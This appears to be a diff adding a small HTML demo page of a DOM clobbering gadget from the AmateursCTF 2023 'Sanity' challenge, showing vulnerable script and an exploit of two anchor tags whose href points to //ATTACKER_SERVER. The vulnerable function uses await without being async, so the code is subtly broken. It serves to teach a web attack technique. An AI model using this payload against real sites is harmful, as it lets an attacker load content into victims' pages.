@@ -1,0 +1,23 @@
+<html>
+    <head>
+    <title>DOM Clobbering Gadget 3: AmateursCTF 2023 Sanity</title>
+    <p>SOURCE:</p>
+    <a href="https://ctftime.org/writeup/37463">https://ctftime.org/writeup/37463</a><br/>
+
+    </head>
+    <body>
+    <p>Vulnerable Code:</p>
+    <script>
+  function loadBody() {
+      let extension = null;
+      if (window.debug?.extension) {
+          let res = await fetch(window.debug?.extension.toString());
+          extension = await res.json();
+      }
+  }
+  loadBody();
+</script>
+    <p>Exploit Code:</p>
+    <a id="debug"></a><a id="debug" name="extension" href="//ATTACKER_SERVER"></a>
+    </body>
+    </html>
